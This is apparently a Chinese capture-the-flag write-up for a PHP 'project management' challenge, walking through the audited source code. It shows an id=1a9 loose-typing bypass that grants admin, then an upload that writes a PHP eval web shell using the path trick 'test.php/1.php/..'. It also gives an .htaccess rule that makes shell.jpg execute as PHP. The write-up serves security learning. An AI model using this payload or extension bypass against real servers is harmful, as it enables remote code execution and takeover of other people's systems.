## 题目描述

工控云管理系统项目管理页面解析漏洞

## 思路

打开题目，点击左侧导航进入项目管理页

![20190907175624.png](https://raw.githubusercontent.com/handbye/images/master/20190907175624.png)

可看到可以查看源码

![20190907175654.png](https://raw.githubusercontent.com/handbye/images/master/20190907175654.png)

源码如下：

```php
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>cetc7</title>
  </head>
  <body>
    <?php
    session_start();

    if (!isset($_GET[page])) {
      show_source(__FILE__);
      die();
    }

    if (isset($_GET[page]) && $_GET[page] != 'index.php') {
      include('flag.php');
    }else {
      header('Location: ?page=flag.php');
    }

    ?>

    <form action="#" method="get">
      page : <input type="text" name="page" value="">
      id : <input type="text" name="id" value="">
      <input type="submit" name="submit" value="submit">
    </form>
    <br />
    <a href="index.phps">view-source</a>

    <?php
     if ($_SESSION['admin']) {
       $con = $_POST['con'];
       $file = $_POST['file'];
       $filename = "backup/".$file;

       if(preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename)){
          die("Bad file extension");
       }else{
            chdir('uploaded');
           $f = fopen($filename, 'w');
           fwrite($f, $con);
           fclose($f);
       }
     }
     ?>

    <?php
      if (isset($_GET[id]) && floatval($_GET[id]) !== '1' && substr($_GET[id], -1) === '9') {
        include 'config.php';
        $id = mysql_real_escape_string($_GET[id]);
        $sql="select * from cetc007.user where id='$id'";
        $result = mysql_query($sql);
        $result = mysql_fetch_object($result);
      } else {
        $result = False;
        die();
      }

      if(!$result)die("<br >something wae wrong ! <br>");
      if($result){
        echo "id: ".$result->id."</br>";
        echo "name:".$result->user."</br>";
        $_SESSION['admin'] = True;
      }
     ?>

  </body>
</html>
```

对源码进行审计

![20190907175802.png](https://raw.githubusercontent.com/handbye/images/master/20190907175802.png)

这段说当session为admin时可以上传文件，文件会保存到`uploaded/backup`目录下，但是使用黑名单过滤掉了`ph(p[3457]?|t|tml)`这些后缀。

![20190907175957.png](https://raw.githubusercontent.com/handbye/images/master/20190907175957.png)

这段说当传入的id值浮点值不能为1，但是id的最后一个数必须为9，session才能为admin。

利用php弱类型语言的特性可轻松绕过这一限制。

如下：

![20190907180230.png](https://raw.githubusercontent.com/handbye/images/master/20190907180230.png)

当id为1a9时可符合上面的要求。

![20190907180310.png](https://raw.githubusercontent.com/handbye/images/master/20190907180310.png)

![20190907180646.png](https://raw.githubusercontent.com/handbye/images/master/20190907180646.png)

可看到现在已经是admin用户了，那就继续上传文件拿到shell。原本想的这里是否可以进行注入，是代码中使用了`mysql_real_escape_string()`函数 , 该函数用于转义SQL语句中使用的字符串中的特殊字符 , 防御SQL注入 . 虽然可以利用宽字符注入绕过这个防御机制 , 但是要求目标站点使用GBK编码 . 这些细节信息我都不知道 , 所以想要注入是比较难的.

那么如何访问上传的文件已经不再是问题 , 需要做的仅仅是突破这个正则过滤 . 正则对文件后缀进行限制 . 所以关键点还是在文件后缀名上

如何突破文件后缀名的限制?主要思路有如下三点

一种是Web中间件的解析漏洞 , 因为已经知道中间件是Apache2 , 使用的是PHP . 所以无非就是Apache解析漏洞或者PHP CGI解析漏洞

一种是通过上传.htaccess文件 , 该文件是Apache的一大特色 . 其中一个功能便是修改不同MIME类型文件使用的解析器 . 但要使用该功能需要Apache在配置文件中设置AllowOverride All , 并且启用Rewrite模块 , 经过测试发现上传的.htaccess无法生效

```php
# 举个例子 : 上传 .htaccess 文件 , 其中写入如下内容
 <FilesMatch "shell.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>
# 此时 , shell.jpg 会被解析为PHP文件
# 但是经过测试这里 .htaccess 功能被禁用了
```

罕见文件后缀 , 想要解析PHP文件 , 并非后缀要是*.php . 如果查看mime.types , 会发现很多文件后缀都使用了application/x-httpd-php这个解析器

![20190907181021.png](https://raw.githubusercontent.com/handbye/images/master/20190907181021.png)

其中 phps 和 php3p 都是源代码文件 , 无法被执行 . 而剩下所有的后缀都被正则表过滤 , 所以这种方式也无法成功上传可执行文件

所以最后还是回到了中间件解析漏洞上 , 但是经过测试发现并不是常规的解析漏洞 , 而是利用了一个Linux的目录结构特性 , 请看下面代码

![20190907181102.png](https://raw.githubusercontent.com/handbye/images/master/20190907181102.png)

创建了一个目录为1.php , 在 1.php 下创建了一个子目录为 2.php 。Linux下每创建一个新目录 , 都会在其中自动创建两个隐藏文件。

![20190907181148.png](https://raw.githubusercontent.com/handbye/images/master/20190907181148.png)

其中 `..` 代表当前目录的父目录 , `.`代表当前目录 , 所以这里访问 `./1.php/2.php/..` 代表访问 `2.php`的父目录 , 也就是访问 `1.php` 。

因此这里构造数据包时 , 可以构造如下POST数据

```php
con=<?php @eval($_POST[cmd]);?>&file=test.php/1.php/..
```

![20190907181726.png](https://raw.githubusercontent.com/handbye/images/master/20190907181726.png)

然后访问上传目录

![20190907181816.png](https://raw.githubusercontent.com/handbye/images/master/20190907181816.png)

可看到已将test.php上传了上去。

使用菜刀连接，即可得到shell，然后找到falg即可

![20190907182101.png](https://raw.githubusercontent.com/handbye/images/master/20190907182101.png)

![20190907182114.png](https://raw.githubusercontent.com/handbye/images/master/20190907182114.png)

参考：

- [http://www.guildhab.top/?p=481](http://www.guildhab.top/?p=481)
